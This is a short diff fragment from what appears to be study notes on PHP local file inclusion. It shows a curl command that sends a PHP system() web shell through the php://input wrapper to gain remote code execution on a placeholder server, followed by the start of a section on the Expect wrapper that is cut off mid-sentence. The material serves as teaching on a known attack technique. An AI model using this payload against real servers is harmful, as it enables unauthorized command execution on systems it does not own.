@@ -112,4 +112,6 @@ similar to data wrapper, we can use input wrapper to archive RCE, notice that in
 curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
 ```
 
-Using 
+Using Expect Wrapper for RCE:
+
+The Expect wrappers allows us to run commands through the URL Streams, however, this wrapper is external, and requires manual installation and be enabled on the backend server, it'
